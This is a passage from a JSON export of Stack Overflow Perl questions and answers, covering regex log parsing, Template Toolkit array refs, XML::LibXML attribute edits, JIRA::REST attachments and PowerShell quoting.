m/\\A\\d.-\\s(\\d{8})\\s(\\d{2}:\\d{2}:\\d{2})\\s-\\s(\\w+)\\s-\\s\\/Extended Info/) {\n                    if ($rows[$rown] =~ m/WARNING/ || $rows[$rown] =~ m/CRITICAL/ &amp;&amp; $rows[$rown] !~ m/INFORMATION/) {  # Shows only errors\n                        my ($date, $time, $class, $message ) = $rows[$rown] =~ m/\\A\\d.-\\s(\\d{8})\\s(\\d{2}:\\d{2}:\\d{2})\\s-\\s(\\w+)\\s-\\s\\/Extended Info\\n(\\w.*)/;\n                        push @evt, {date =&gt; $date, time =&gt; $time, classification =&gt; $class, information =&gt; $message};\n                    }\n                }\n            }\n        }\n    }\n}\n</code></pre>\n\n<p>This is log example:</p>\n\n<pre><code>0#- 20180403 11:11:11 - ERROR - /Extended Info\nFs Doesn't work...\n\n1#- 20180403 11:12:13 - ERROR - /Extended Info\nFs Doesn't work...\n</code></pre>\n\n<p>could you help me to clarify?</p>\n"}, {"tags": ["regex", "perl"], "comments": [{"owner": {"reputation": 8926, "user_id": 5331061, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/g1Sv2.jpg?s=128&g=1", "display_name": "Gurmanjot Singh", "link": "https://stackoverflow.com/users/5331061/gurmanjot-singh"}, "edited": false, "score": 0, "creation_date": 1532611822, "post_id": 51539971, "comment_id": 90047761, "body": "Try <a href=\"https://regex101.com/r/G5RVtd/2/\" rel=\"nofollow noreferrer\">this</a>"}, {"owner": {"reputation": 8974, "user_id": 205207, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/1OH7W.jpg?s=128&g=1", "display_name": "i alarmed alien", "link": "https://stackoverflow.com/users/205207/i-alarmed-alien"}, "edited": false, "score": 2, "creation_date": 1532611972, "post_id": 51539971, "comment_id": 90047878, "body": "Please post the code you have written so far. What you have written is not valid perl."}, {"owner": {"reputation": 137100, "user_id": 874188, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/ZcY77.png?s=128&g=1", "display_name": "tripleee", "link": "https://stackoverflow.com/users/874188/tripleee"}, "edited": false, "score": 1, "creation_date": 1532617467, "post_id": 51539971, "comment_id": 90051668, "body": "A string contains characters and nothing else. There are no non-characters in your example, and there is no way for a string to contain something which isn&#39;t a character."}], "answers": [{"tags": [], "owner": {"reputation": 38072, "user_id": 46395, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/5ce828f20abb195ef5d971205ee36c27?s=128&d=identicon&r=PG", "display_name": "daxim", "link": "https://stackoverflow.com/users/46395/daxim"}, "is_accepted": true, "score": -1, "last_activity_date": 1532614081, "creation_date": 1532614081, "answer_id": 51540853, "question_id": 51539971, "link": "https://stackoverflow.com/questions/51539971/how-can-i-search-and-replace-a-non-character-in-a-string-in-perl/51540853#51540853", "title": "how can i search and replace a non-character in a string in perl?", "body": "<pre><code>my $line1 = 'violation:start:CLK:a1.ID:end:a2.VALUE[22:0]:CLK1';\nmy $line2 = 'violation:start:CLK2:b1.ID[23:45]:end:b2.VALUE[2:03]:CLK3';\nfor ($line1, $line2) {\n    s/\\[ (\\d+) : (\\d+) \\]/[$1#$2]/gmsx;\n}\nprint \"$line1\\n$line2\\n\";\n__END__\nviolation:start:CLK:a1.ID:end:a2.VALUE[22#0]:CLK1\nviolation:start:CLK2:b1.ID[23#45]:end:b2.VALUE[2#03]:CLK3\n</code></pre>\n"}], "owner": {"reputation": 1, "user_id": 10105182, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-5VIbvi1nE2M/AAAAAAAAAAI/AAAAAAAABMA/2nvLvjjm38A/photo.jpg?sz=128", "display_name": "Ram", "link": "https://stackoverflow.com/users/10105182/ram"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 49, "favorite_count": 0, "accepted_answer_id": 51540853, "answer_count": 1, "score": -4, "last_activity_date": 1532614081, "creation_date": 1532611417, "last_edit_date": 1532611600, "question_id": 51539971, "link": "https://stackoverflow.com/questions/51539971/how-can-i-search-and-replace-a-non-character-in-a-string-in-perl", "title": "how can i search and replace a non-character in a string in perl?", "body": "<p>I have the following format data</p>\n\n<pre><code>$line1 = violation:start:CLK:a1.ID:end:a2.VALUE[22:0]:CLK1\n$line2 = violation:start:CLK2:b1.ID[23:45]:end:b2.VALUE[2:03]:CLK3\n</code></pre>\n\n<p>So, how can i search and replace [\\d+:\\d+] with [\\d+#\\d+]</p>\n\n<p>For example: [22:0] to [22#0]</p>\n\n<p>Please help me!</p>\n"}, {"tags": ["perl", "template-toolkit"], "comments": [{"owner": {"reputation": 8974, "user_id": 205207, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/1OH7W.jpg?s=128&g=1", "display_name": "i alarmed alien", "link": "https://stackoverflow.com/users/205207/i-alarmed-alien"}, "edited": false, "score": 1, "creation_date": 1532610912, "post_id": 51539514, "comment_id": 90047114, "body": "Possible duplicate of <a href=\"https://stackoverflow.com/questions/23912898/how-to-detect-array-type-in-template-toolkit\">How to detect array type in Template toolkit?</a>"}], "answers": [{"tags": [], "owner": {"reputation": 1448, "user_id": 5464233, "user_type": "registered", "profile_image": "https://graph.facebook.com/10208326386304302/picture?type=large", "display_name": "Guido Flohr", "link": "https://stackoverflow.com/users/5464233/guido-flohr"}, "is_accepted": false, "score": 1, "last_activity_date": 1534160220, "creation_date": 1534160220, "answer_id": 51821476, "question_id": 51539514, "link": "https://stackoverflow.com/questions/51539514/perl-template-alloy-and-template-toolkit-array-ref/51821476#51821476", "title": "Perl - Template Alloy and Template toolkit array ref", "body": "<p>This line is wrong in multiple ways:</p>\n\n<pre><code>[% IF ref.parent ne \"ARRAY\" %]\n</code></pre>\n\n<p>You try to dereference a (non-existing) variable <code>ref</code>.  Instead you wanted something like <code>parent.ref()</code> to invoke a VMethod <code>ref</code> on the variable <code>parent</code>.  But there is no such VMethod in Template Toolkit.</p>\n\n<p>And there is also no operator <code>ne</code> in Template Toolkit.  It's <code>!=</code>.  You have to find out where syntax errors are logged and check that.</p>\n\n<p>There is a hack though to find out whether a variable is a plain array reference.  You can try this code with your example Perl file:</p>\n\n<pre><code>[% stringified = '' _ menus %]\n[% IF stringified.match('ARRAY\\\\(0x[0-9a-f]+\\\\)') %]\n    array ref ([% stringified %])\n[% ELSE %]\n    not an array ref ([% stringified %])\n[% END %]\n</code></pre>\n\n<p>Basically, this checks whether the variable <code>menus</code>, when coerced into a string, matches the default rendering of an array reference in Template Toolkit (and Perl).  It's a hack with a number of caveats but it works for practical purposes, when you know your input data.</p>\n"}], "owner": {"reputation": 366, "user_id": 8569128, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f2cde21e40e767064c4e4e0b61f1b8f8?s=128&d=identicon&r=PG&f=1", "display_name": "Imylor", "link": "https://stackoverflow.com/users/8569128/imylor"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 165, "favorite_count": 0, "answer_count": 1, "score": 2, "last_activity_date": 1534160220, "creation_date": 1532610164, "last_edit_date": 1532610514, "question_id": 51539514, "link": "https://stackoverflow.com/questions/51539514/perl-template-alloy-and-template-toolkit-array-ref", "title": "Perl - Template Alloy and Template toolkit array ref", "body": "<p>I using template alloy and Template toolkit, in TT I want to detect array reference like i do with perl:</p>\n\n<pre><code>for my $parents ( @{$value} ){\n\n  if (ref($parents) ne 'ARRAY'){\n    push @all_urls_names, $parents;\n  }\n\n}\n</code></pre>\n\n<p>This is my code in tt:</p>\n\n<pre><code>use warnings;\nuse v5.20; #strict is already set in the version\n\nuse Template;\n\nmy $t = Template-&gt;new(\n    INCLUDE_PATH =&gt; ['.'],\n);\n\nmy @menus = ( \n\n [\"parent\",\n   [qw(child1 child12 child13 child14) ]\n ],\n\n );\n\nmy $mvs = {# my variables\n   menus =&gt; \\@menus\n};\n\n$t-&gt;process(\"index.tt\", $mvs, \\my $out) || die $t-&gt;error;\n\nsub {\n   return [ 200, [], [ $out ] ];\n}\n</code></pre>\n\n<p>In the index.tt:</p>\n\n<pre><code>[% FOR base = menus %]\n\n [% FOR parent = base %]\n\n   [% IF ref.parent ne \"ARRAY\" %]\n      &lt;li&gt;[% parent %] &lt;/li&gt;\n   [% END %]\n\n [% END %]\n\n[% END %]\n</code></pre>\n\n<p>If I remove the <code>IF</code> statement, I get this:</p>\n\n<p>parent\nARRAY(0x2539ad8)</p>\n\n<p>I want to just get <code>parent</code></p>\n\n<p>I can fix just doing  [% FOR parent = base.0 %]</p>\n\n<p>but I want to know a solution to get ref array in TT.</p>\n"}, {"tags": ["perl", "xml-libxml"], "comments": [{"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1532612266, "post_id": 51539067, "comment_id": 90048107, "body": "It&#39;s a bit late to test <code>-e $filename</code> after you&#39;ve loaded your XML document from it!"}], "answers": [{"tags": [], "owner": {"reputation": 3509, "user_id": 4243840, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/aaeabd769bae1bf82fd4b8882fed6653?s=128&d=identicon&r=PG", "display_name": "JGNI", "link": "https://stackoverflow.com/users/4243840/jgni"}, "is_accepted": false, "score": 1, "last_activity_date": 1532611894, "creation_date": 1532611894, "answer_id": 51540111, "question_id": 51539067, "link": "https://stackoverflow.com/questions/51539067/find-replace-values-using-xmllibxml-with-perl/51540111#51540111", "title": "Find / Replace values using XML::LibXML with Perl", "body": "<p>An attribute node can be got by giving the attribute name preceded by an @ as the last element of the XPath, so change</p>\n\n<pre><code>my $mediaId = join '', map { $_-&gt;{id}; } $dom-&gt;findnodes('/ScheduleProvider/Episode/Media');\nmy $vodItemId = join '', map { $_-&gt;{id}; } $dom-&gt;findnodes('/ScheduleProvider/VodItem');\n</code></pre>\n\n<p>to</p>\n\n<pre><code>foreach my $attribute ($dom-&gt;findnodes('/ScheduleProvider/Episode/Media/@id') {\n    $attribute-&gt;setValue($mediaIdFrom);\n}\n\nforeach my $attribute ($dom-&gt;findnodes('/ScheduleProvider/VoidItem/@id') {\n    $attribute-&gt;setValue($VodItemIdFrom);\n}\n</code></pre>\n\n<p>This will iterate over each id attribute node allowing you to update the attribute using the <code>setValue()</code> method.</p>\n\n<p>Then you should be able to use the <code>toFile()</code> method on the dom object to write out the updated version without having to reopen the input file file</p>\n"}, {"tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": true, "score": 2, "last_activity_date": 1532613514, "last_edit_date": 1532613514, "creation_date": 1532613052, "answer_id": 51540494, "question_id": 51539067, "link": "https://stackoverflow.com/questions/51539067/find-replace-values-using-xmllibxml-with-perl/51540494#51540494", "title": "Find / Replace values using XML::LibXML with Perl", "body": "<p>This will do what you want. You just needed to call <code>setAttributes</code> on the elements that you had located with <code>findnodes</code></p>\n\n<pre><code>use strict;\nuse warnings 'all';\n\nuse XML::LibXML;\n\nmy $filename         = 'sample.xml';\nmy $out_filename     = \"$filename.new\";\nmy $media_id_from    = 'MEDIAID_TEST';\nmy $vod_item_id_from = 'VODITEM_ID_TEST';\n\nmy $doc = XML::LibXML-&gt;load_xml(location =&gt; $filename);\n\nmy ($media) = $doc-&gt;findnodes('/ScheduleProvider/Episode/Media');\n$media-&gt;setAttribute(id =&gt; $media_id_from);\n\nmy ($vod_item) = $doc-&gt;findnodes('/ScheduleProvider/VodItem');\n$vod_item-&gt;setAttribute(id =&gt; $vod_item_id_from);\n\n$doc-&gt;toFile($out_filename);\n</code></pre>\n"}], "owner": {"reputation": 166, "user_id": 3399702, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/n2ObF.jpg?s=128&g=1", "display_name": "Seth", "link": "https://stackoverflow.com/users/3399702/seth"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 212, "favorite_count": 0, "accepted_answer_id": 51540494, "answer_count": 2, "score": 0, "last_activity_date": 1532620402, "creation_date": 1532608773, "last_edit_date": 1532620402, "question_id": 51539067, "link": "https://stackoverflow.com/questions/51539067/find-replace-values-using-xmllibxml-with-perl", "title": "Find / Replace values using XML::LibXML with Perl", "body": "<p>I've read some others topics here but this doesn't fit to my sample.\nI have an XML file where I want to find and replace specific values.</p>\n\n<p>My script is working with expecting result, but it's quite ugly because I don't use all reassources from the module.\nI've tried with <code>$node-&gt;setData($content);</code> and <code>$dom-&gt;toFile($filename)</code> but without successful.</p>\n\n<p><strong>Question:</strong>\nThe goal is to find the id from the Media <em>(line 29 column 20 from the XML sample)</em> in order to replace it by <code>$mediaIdFrom</code> with a better way using the module without open/close files.</p>\n\n<p><strong>Here the script:</strong></p>\n\n<pre><code>#!/usr/bin/perl\nuse strict;\nuse warnings 'all';\nuse autodie;\nuse feature 'say';\nuse XML::LibXML;\n\nmy $mediaIdFrom = \"MEDIAID_TEST\";\nmy $VodItemIdFrom = \"VODITEM_ID_TEST\";\n\nmy $filename = 'sample.xml';\nmy $out_filename = $filename . \".new\";\n\nmy $dom = XML::LibXML -&gt; load_xml(location =&gt; $filename);\n\nmy $mediaId = join '', map { $_-&gt;{id}; } $dom-&gt;findnodes('/ScheduleProvider/Episode/Media');\nmy $vodItemId = join '', map { $_-&gt;{id}; } $dom-&gt;findnodes('/ScheduleProvider/VodItem');\n\nif (-e $filename) {\n        open(IN, \"&lt;\", $filename);\n        open(OUT, \"&gt;\", $out_filename);\n        while (&lt;IN&gt;) {\n                chomp;\n                $_ =~ s/\\\"$mediaId\\\"/\\\"$mediaIdFrom\\\"/g if /$mediaId/;\n                $_ =~ s/\\\"$vodItemId\\\"/\\\"$VodItemIdFrom\\\"/g if /$vodItemId/;\n                say $_;\n                say OUT $_;\n        }\n        close(IN);\n        close(OUT);\n}\n</code></pre>\n\n<p><strong>Here the sample:</strong></p>\n\n<pre><code>&lt;?xml version=\"1.0\" encoding=\"utf-8\" standalone=\"yes\"?&gt;\n&lt;ScheduleProvider id=\"TST\" name=\"SHOP\" scheduleDate=\"2018-07-05T23:05:45Z\"&gt;\n    &lt;Product action=\"override\" endPurchase=\"2018-08-04T21:59:00Z\" endValidity=\"2018-09-05T03:31:00Z\" id=\"TSTP937279650001\" regions=\"Country\" rentalDuration=\"2611920\" startPurchase=\"2018-07-05T16:27:00Z\" startValidity=\"2018-07-05T16:27:00Z\" type=\"single\"&gt;\n        &lt;Price currency=\"EUR\" startPurchase=\"2018-07-05T16:27:00Z\" endPurchase=\"2018-08-04T21:59:00Z\"&gt;0.00&lt;/Price&gt;\n        &lt;EpgDescription locale=\"fr_FR\"&gt;\n            &lt;EpgElement key=\"Title\"&gt;NO TITLE&lt;/EpgElement&gt;\n        &lt;/EpgDescription&gt;\n    &lt;/Product&gt;\n    &lt;Series id=\"TST903350550001\" action=\"override\" title=\"Seasons - S1\"&gt;\n        &lt;EpgDescription locale=\"fr_FR\"&gt;\n            &lt;EpgElement key=\"Title\"&gt;Seasons - S1&lt;/EpgElement&gt;\n            &lt;EpgElement key=\"Synopsis\"&gt;Smart&lt;/EpgElement&gt;\n            &lt;EpgElement key=\"ShortTitle\"&gt;Seasons - S1&lt;/EpgElement&gt;\n        &lt;/EpgDescription&gt;\n        &lt;EpgDescription&gt;\n            &lt;EpgElement key=\"Aspect\"&gt;16:9&lt;/EpgElement&gt;\n            &lt;EpgElement key=\"PromoImage\"&gt;TST_ANT_1192194.jpg&lt;/EpgElement&gt;\n        &lt;/EpgDescription&gt;\n    &lt;/Series&gt;\n    &lt;Episode action=\"override\" duration=\"1080\" id=\"TST937279650001\" title=\"\u00c9pisode 9\" number=\"9\" episodeList=\"9\" seriesRef=\"TST903350550001\"&gt;\n        &lt;EpgDescription locale=\"fr_FR\"&gt;\n            &lt;EpgElement key=\"Title\"&gt;\u00c9pisode 9&lt;/EpgElement&gt;\n            &lt;EpgElement key=\"Synopsis\"&gt;George&lt;/EpgElement&gt;\n        &lt;/EpgDescription&gt;\n        &lt;EpgDescription&gt;\n            &lt;EpgElement key=\"Aspect\"&gt;16:9&lt;/EpgElement&gt;\n            &lt;EpgElement key=\"PromoImage\"&gt;TST_ANT_1192194.jpg&lt;/EpgElement&gt;\n        &lt;/EpgDescription&gt;\n        &lt;Media id=\"TSTM937279650001\" fileName=\"TSTM937279650001.ts\" frameDuration=\"27000\" fileSize=\"477380316\"/&gt;\n    &lt;/Episode&gt;\n    &lt;VodItem action=\"override\" contentRef=\"TST937279650001\" id=\"TSTV937279650001\" nodeRefs=\"TSTFRA1001\" previewDate=\"2016-01-05T16:27:00Z\" productRefs=\"TSTP937279650001\" title=\"\u00c9pisode 9\" broadcasterId=\"TST\"&gt;\n        &lt;EpgDescription&gt;\n            &lt;EpgElement key=\"Studio\"&gt;Replay&lt;/EpgElement&gt;\n        &lt;/EpgDescription&gt;\n        &lt;EpgDescription locale=\"fr_FR\"&gt;\n            &lt;EpgElement key=\"Title\"&gt;\u00c9pisode 9&lt;/EpgElement&gt;\n            &lt;EpgElement key=\"Synopsis\"&gt;George&lt;/EpgElement&gt;\n        &lt;/EpgDescription&gt;\n        &lt;Period start=\"2018-07-05T16:27:00Z\" end=\"2018-08-04T21:59:00Z\"/&gt;\n    &lt;/VodItem&gt;\n&lt;/ScheduleProvider&gt;\n</code></pre>\n"}, {"tags": ["perl", "jira", "jira-rest-api"], "comments": [{"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 0, "creation_date": 1532597838, "post_id": 51535522, "comment_id": 90038825, "body": "Have you tried the <code>attach_files</code> method?"}, {"owner": {"reputation": 614, "user_id": 3300422, "user_type": "registered", "accept_rate": 57, "profile_image": "https://i.stack.imgur.com/6kMVK.jpg?s=128&g=1", "display_name": "Nataraj", "link": "https://stackoverflow.com/users/3300422/nataraj"}, "reply_to_user": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 0, "creation_date": 1532598177, "post_id": 51535522, "comment_id": 90039068, "body": "If used attach_files method as getting an error like (Undefined subroutine &amp;Encode::encode_utf8 called at /usr/local/share/perl5/JIRA/REST.pm line 355.)"}, {"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 0, "creation_date": 1532599179, "post_id": 51535522, "comment_id": 90039726, "body": "Try adding <code>use Encode;</code> somewhere near the top of /usr/local/share/perl5/JIRA/REST.pm"}, {"owner": {"reputation": 614, "user_id": 3300422, "user_type": "registered", "accept_rate": 57, "profile_image": "https://i.stack.imgur.com/6kMVK.jpg?s=128&g=1", "display_name": "Nataraj", "link": "https://stackoverflow.com/users/3300422/nataraj"}, "reply_to_user": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 0, "creation_date": 1532599403, "post_id": 51535522, "comment_id": 90039868, "body": "Added encode to pm file. still, the same issue is existing also updated the code according to attach_files"}, {"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 0, "creation_date": 1532599519, "post_id": 51535522, "comment_id": 90039941, "body": "Very unlikely. If Encode is present (and it should, it&#39;s core since 5.8), it should work. What version of Perl and Encode do you run?"}, {"owner": {"reputation": 614, "user_id": 3300422, "user_type": "registered", "accept_rate": 57, "profile_image": "https://i.stack.imgur.com/6kMVK.jpg?s=128&g=1", "display_name": "Nataraj", "link": "https://stackoverflow.com/users/3300422/nataraj"}, "reply_to_user": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 0, "creation_date": 1532599694, "post_id": 51535522, "comment_id": 90040056, "body": "my current version is  perl, v5.10.1"}, {"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 0, "creation_date": 1532599800, "post_id": 51535522, "comment_id": 90040129, "body": "What version of Perl <b>and Encode</b> do you run?"}, {"owner": {"reputation": 614, "user_id": 3300422, "user_type": "registered", "accept_rate": 57, "profile_image": "https://i.stack.imgur.com/6kMVK.jpg?s=128&g=1", "display_name": "Nataraj", "link": "https://stackoverflow.com/users/3300422/nataraj"}, "reply_to_user": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 0, "creation_date": 1532600659, "post_id": 51535522, "comment_id": 90040675, "body": "Encode::CN --&gt;2.98"}, {"owner": {"reputation": 614, "user_id": 3300422, "user_type": "registered", "accept_rate": 57, "profile_image": "https://i.stack.imgur.com/6kMVK.jpg?s=128&g=1", "display_name": "Nataraj", "link": "https://stackoverflow.com/users/3300422/nataraj"}, "reply_to_user": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 0, "creation_date": 1532600803, "post_id": 51535522, "comment_id": 90040752, "body": "I don&#39;t know which version I need to use please suggest me"}, {"owner": {"reputation": 614, "user_id": 3300422, "user_type": "registered", "accept_rate": 57, "profile_image": "https://i.stack.imgur.com/6kMVK.jpg?s=128&g=1", "display_name": "Nataraj", "link": "https://stackoverflow.com/users/3300422/nataraj"}, "reply_to_user": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 0, "creation_date": 1532601295, "post_id": 51535522, "comment_id": 90041042, "body": "Now It working fine after adding to Encode module. thanks for your help."}], "answers": [{"comments": [{"owner": {"reputation": 614, "user_id": 3300422, "user_type": "registered", "accept_rate": 57, "profile_image": "https://i.stack.imgur.com/6kMVK.jpg?s=128&g=1", "display_name": "Nataraj", "link": "https://stackoverflow.com/users/3300422/nataraj"}, "edited": false, "score": 0, "creation_date": 1532598947, "post_id": 51535671, "comment_id": 90039579, "body": "I am getting an error if you above one. &quot;Undefined subroutine &amp;Encode::encode_utf8 called at /usr/local/share/perl5/JIRA/REST.pm line 355&quot;"}, {"owner": {"reputation": 43, "user_id": 10134195, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/992be08906b17fa83ebfb1272b0e4b05?s=128&d=identicon&r=PG&f=1", "display_name": "PKI Guy", "link": "https://stackoverflow.com/users/10134195/pki-guy"}, "reply_to_user": {"reputation": 614, "user_id": 3300422, "user_type": "registered", "accept_rate": 57, "profile_image": "https://i.stack.imgur.com/6kMVK.jpg?s=128&g=1", "display_name": "Nataraj", "link": "https://stackoverflow.com/users/3300422/nataraj"}, "edited": false, "score": 0, "creation_date": 1532599262, "post_id": 51535671, "comment_id": 90039786, "body": "Then you probably need to install perl module Encode.pm , e.g. using the same way that you used to install JIRA::REST."}, {"owner": {"reputation": 614, "user_id": 3300422, "user_type": "registered", "accept_rate": 57, "profile_image": "https://i.stack.imgur.com/6kMVK.jpg?s=128&g=1", "display_name": "Nataraj", "link": "https://stackoverflow.com/users/3300422/nataraj"}, "edited": false, "score": 0, "creation_date": 1532600899, "post_id": 51535671, "comment_id": 90040810, "body": "If I type Encode in cpan website. It showing many option Which one I need to use"}, {"owner": {"reputation": 614, "user_id": 3300422, "user_type": "registered", "accept_rate": 57, "profile_image": "https://i.stack.imgur.com/6kMVK.jpg?s=128&g=1", "display_name": "Nataraj", "link": "https://stackoverflow.com/users/3300422/nataraj"}, "edited": false, "score": 0, "creation_date": 1532601317, "post_id": 51535671, "comment_id": 90041062, "body": "Now It working fine after adding to Encode module. thanks for your help."}], "tags": [], "owner": {"reputation": 43, "user_id": 10134195, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/992be08906b17fa83ebfb1272b0e4b05?s=128&d=identicon&r=PG&f=1", "display_name": "PKI Guy", "link": "https://stackoverflow.com/users/10134195/pki-guy"}, "is_accepted": false, "score": 0, "last_activity_date": 1532597861, "creation_date": 1532597861, "answer_id": 51535671, "question_id": 51535522, "link": "https://stackoverflow.com/questions/51535522/cant-upload-attachments-on-jira-via-perl-script/51535671#51535671", "title": "can&#39;t upload attachments on Jira via Perl script", "body": "<p>you should use <code>attach_files</code> to attach files using JIRA::REST:</p>\n\n<pre><code>$jira-&gt;attach_files($key,($filename));\n</code></pre>\n\n<p>Note that you pass an array, which means you can at several files at once.</p>\n"}], "owner": {"reputation": 614, "user_id": 3300422, "user_type": "registered", "accept_rate": 57, "profile_image": "https://i.stack.imgur.com/6kMVK.jpg?s=128&g=1", "display_name": "Nataraj", "link": "https://stackoverflow.com/users/3300422/nataraj"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 68, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1532599157, "creation_date": 1532597436, "last_edit_date": 1532599157, "question_id": 51535522, "link": "https://stackoverflow.com/questions/51535522/cant-upload-attachments-on-jira-via-perl-script", "title": "can&#39;t upload attachments on Jira via Perl script", "body": "<p>How to add an attachment using JIRA::REST?</p>\n\n<p>I can able to create the Jira ticket. But I am unable to attach the text file. please help on this matter.</p>\n\n<p>Error message : </p>\n\n<pre><code> ERROR: @  JIRA::REST Error[415 - Unsupported Media Type]:\n at copy_of_new-jira.pl line 56. \n</code></pre>\n\n<p><strong>Perl script</strong></p>\n\n<pre><code>#Mobules of script   \n    use JIRA::REST;\n    use Data::Dumper;\n    use Devel::Trace;\n    use JSON; \n\n    # Iterate on issues\n    my $search = $jira-&gt;POST('/search', undef, {\n        jql        =&gt; 'project = xxx AND issuetype = Bug AND status = Unassigned AND created &gt;= -10m',\n        startAt    =&gt; 0,\n        maxResults =&gt; 1,\n        fields     =&gt; [ qw/summary status assignee/ ],\n    });\n\n    foreach my $issue (@{$search-&gt;{issues}}) {\n        print \"Found issue $issue-&gt;{key}\\n\";\n    }\n\n\n    # Attach files using an utility method\n\n     my $filename = \"/root/perl-script/image.txt\"; \n     # Attach files using an utility method\n     $jira-&gt;attach_files(xxx-56639, ($filename));\n</code></pre>\n"}, {"tags": ["perl", "powershell", "quotes"], "comments": [{"owner": {"user_type": "does_not_exist", "display_name": "user6811411"}, "edited": false, "score": 1, "creation_date": 1532593418, "post_id": 51532675, "comment_id": 90035993, "body": "There is only one windows perl version and I think perl itself handles arguments differently due to the restrictions when working under cmd.exe where single quotes have no special meaning"}, {"owner": {"reputation": 65, "user_id": 5674123, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/96b8df26eca0fc6e26e571b4491e0c20?s=128&d=identicon&r=PG&f=1", "display_name": "ajith.mk", "link": "https://stackoverflow.com/users/5674123/ajith-mk"}, "edited": false, "score": 0, "creation_date": 1532596262, "post_id": 51532675, "comment_id": 90037889, "body": "found this <a href=\"https://stackoverflow.com/questions/1250044/why-is-powershell-with-perl-removing-double-quotes-in-a-simple-print-statement?rq=1\">link</a> .It seems perl on windows has its own quirks."}, {"owner": {"user_type": "does_not_exist", "display_name": "user6811411"}, "edited": false, "score": 0, "creation_date": 1532597392, "post_id": 51532675, "comment_id": 90038563, "body": "I&#39;d prefer to call it design decisions to have it work under windows, made at a time you couldn&#39;t even dream of powershell."}], "answers": [{"comments": [{"owner": {"user_type": "does_not_exist", "display_name": "user6811411"}, "edited": false, "score": 0, "creation_date": 1532597397, "post_id": 51534704, "comment_id": 90038566, "body": "@TobyU posted a very similar answer,  meanwhile deleted due to downvotes because not related to the question. I&#39;m wondering why you got an upvote."}, {"owner": {"reputation": 924, "user_id": 10115111, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-pKBEaezWLP8/AAAAAAAAAAI/AAAAAAAAAAc/WHN0GwdbIYs/photo.jpg?sz=128", "display_name": "Henrik Stanley Mortensen", "link": "https://stackoverflow.com/users/10115111/henrik-stanley-mortensen"}, "edited": false, "score": 0, "creation_date": 1532597648, "post_id": 51534704, "comment_id": 90038724, "body": "Well, the question literally starts with &quot;What exactly are the rules for 